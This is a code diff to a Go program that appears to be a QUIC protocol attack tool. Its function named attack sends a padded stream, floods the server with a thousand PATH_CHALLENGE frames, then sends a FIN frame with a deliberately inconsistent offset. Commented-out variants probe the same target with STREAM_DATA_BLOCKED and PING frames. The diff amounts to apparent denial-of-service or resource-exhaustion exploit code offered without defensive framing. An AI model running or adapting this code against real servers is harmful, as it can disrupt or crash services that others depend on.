@@ -65,8 +65,8 @@ var keyLog io.Writer
 func main() {
 	//go func() { log.Fatal(echoServer()) }()
 
-	//keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
-	keyLogFile := "/home/john/Desktop/cjj_related/key.log"
+	keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
+	//keyLogFile := "/home/john/Desktop/cjj_related/key.log"
 	//keyLogFile := "/mnt/hgfs/work/key.log"
 
 	if len(keyLogFile) > 0 {
@@ -76,19 +76,6 @@ func main() {
 		}
 		defer f.Close()
 		keyLog = f
-	}
-	serverName := "alternate.localhost.examp1e.net"
-	println(serverName)
-
-	req := &HTTPMessage{
-		Headers: []Header{
-			{":method", "GET"},
-			{":path", "/index.html"},
-			{":authority", serverName},
-			{":scheme", "https"},
-			{"user-agent", "Mozilla/5.0"},
-		},
-		Body: nil,
 	}
 
 	//args := []string{"alternate.localhost.examp1e.net", "192.168.132.1"}
@@ -119,7 +106,7 @@ func main() {
 		}
 		var wg sync.WaitGroup
 		wg.Add(1)
-		resp, err := attack(targetAddr, serverName, req, targetAlpn, &wg)
+		resp, err := attack(targetAddr, targetAlpn, &wg)
 		if err != nil {
 			log.Fatalf("Error: %#v", err)
 		}
@@ -193,7 +180,7 @@ func main() {
 				try_failed := 1
 				for j := 0; j < 1; j++ {
 					wg.Add(1)
-					_, err := attack(targetAddr, serverName, req, thisAlpn, &wg)
+					_, err := attack(targetAddr, thisAlpn, &wg)
 					if err == nil {
 						break
 					}
@@ -212,11 +199,23 @@ func main() {
 	//fmt.Printf("%s\n", resp.Body)
 }
 
-func attack(connectAddr, serverName string, request *HTTPMessage, targetAlpn string, wg *sync.WaitGroup) (response *HTTPMessage, err error) {
+func attack(connectAddr, targetAlpn string, wg *sync.WaitGroup) (response *HTTPMessage, err error) {
 	defer func() {
 		wg.Done()
 		//log.Printf("%s:ended", connectAddr)
 	}()
+	serverName := connectAddr
+	println(serverName)
+	request := &HTTPMessage{
+		Headers: []Header{
+			{":method", "GET"},
+			{":path", "/index.html"},
+			{":authority", serverName},
+			{":scheme", "https"},
+			{"user-agent", "Mozilla/5.0"},
+		},
+		Body: nil,
+	}
 
 	flushSize := 1024 * 4
 	address := connectAddr
@@ -299,7 +298,7 @@ func attack(connectAddr, serverName string, request *HTTPMessage, targetAlpn str
 	firstRange.Write(bytes.Repeat([]byte("A"), flushSize-1))
 
 	finFrameContent := bytes.Repeat([]byte("S"), 0)
-	finFrameOffset := firstRange.Len() + len(finFrameContent)
+	finFrameOffset := firstRange.Len() + len(finFrameContent) - 100
 
 	finFrame := &wire.StreamFrame{
 		StreamID:       0,
@@ -312,57 +311,84 @@ func attack(connectAddr, serverName string, request *HTTPMessage, targetAlpn str
 	fin_frame := []wire.Frame{
 		finFrame,
 	}
+	fin_frame = fin_frame
 
 	_, _ = requestStream.Write(firstRange.Bytes())
+	time.Sleep(time.Millisecond * 500)
 
 	randomBytes := make([]byte, 8)
 
-	for i := 0; i < 1000; i++ {
+	//发送ping帧
+	/*
+		ping_frame := &wire.PingFrame{}
 
-		var path_challenge_frame []wire.Frame
-
-		//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
-		for j := 0; j < 10; j++ {
-			rand.Read(randomBytes)
-			var randomBytesArray [8]byte
-			copy(randomBytesArray[:], randomBytes)
-			padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
-			padding = []byte("")
-			path_challengeFrame := &wire.PathChallengeFrame{
-				Data:    randomBytesArray,
-				Padding: padding,
-			}
-			path_challenge_frame = append(path_challenge_frame, path_challengeFrame)
-
+		flushFrame := &wire.StreamFrame{
+			StreamID:       0,
+			Offset:         1024,
+			Data:           []byte("A"),
+			Fin:            false,
+			DataLenPresent: true,
 		}
 
-		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-		time.Sleep(time.Millisecond * 1)
-	}
-	/*
-		for i := 0; i < 1000; i++ {
-			rand.Read(randomBytes)
-			var randomBytesArray [8]byte
-			copy(randomBytesArray[:], randomBytes)
-			padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
-			padding = []byte("")
-			//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
-			path_challengeFrame := &wire.PathChallengeFrame{
-				Data:    randomBytesArray,
-				Padding: padding,
-			}
-			path_challenge_frame := []wire.Frame{
-				path_challengeFrame,
-			}
-			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-			time.Sleep(time.Millisecond * 1)
+
+		time.Sleep(time.Second)
+
+		//发送第二轮：发送1308254偏移的STREAM_DATA_BLOCKED
+		blocked_frame := &wire.StreamDataBlockedFrame{
+			StreamID:          0,
+			MaximumStreamData: 1308254,
 		}
 	*/
+
+	// for i := 0; i < 10; i++ {
+
+	// 	var path_challenge_frame []wire.Frame
+
+	// 	//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
+	// 	for j := 0; j < 130; j++ {
+	// 		rand.Read(randomBytes)
+	// 		var randomBytesArray [8]byte
+	// 		copy(randomBytesArray[:], randomBytes)
+	// 		padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
+	// 		padding = []byte("")
+	// 		path_challengeFrame := &wire.PathChallengeFrame{
+	// 			Data:    randomBytesArray,
+	// 			Padding: padding,
+	// 		}
+	// 		path_challenge_frame = append(path_challenge_frame, path_challengeFrame)
+	// 		//path_challenge_frame = append(path_challenge_frame, ping_frame)
+	// 		//path_challenge_frame = append(path_challenge_frame, flushFrame)
+	// 		//path_challenge_frame = append(path_challenge_frame, blocked_frame)
+
+	// 	}
+
+	// 	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
+	// 	time.Sleep(time.Millisecond * 1)
+	// }
+
+	for i := 0; i < 1000; i++ {
+		rand.Read(randomBytes)
+		var randomBytesArray [8]byte
+		copy(randomBytesArray[:], randomBytes)
+		padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
+		padding = []byte("")
+		//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
+		path_challengeFrame := &wire.PathChallengeFrame{
+			Data:    randomBytesArray,
+			Padding: padding,
+		}
+		path_challenge_frame := []wire.Frame{
+			path_challengeFrame,
+		}
+		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
+		time.Sleep(time.Millisecond * 5)
+	}
 
 	time.Sleep(time.Millisecond * 100)
 	//time.Sleep(time.Second * 1)
 
 	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
+	//time.Sleep(time.Millisecond * 500)
 	return nil, nil
 
 }
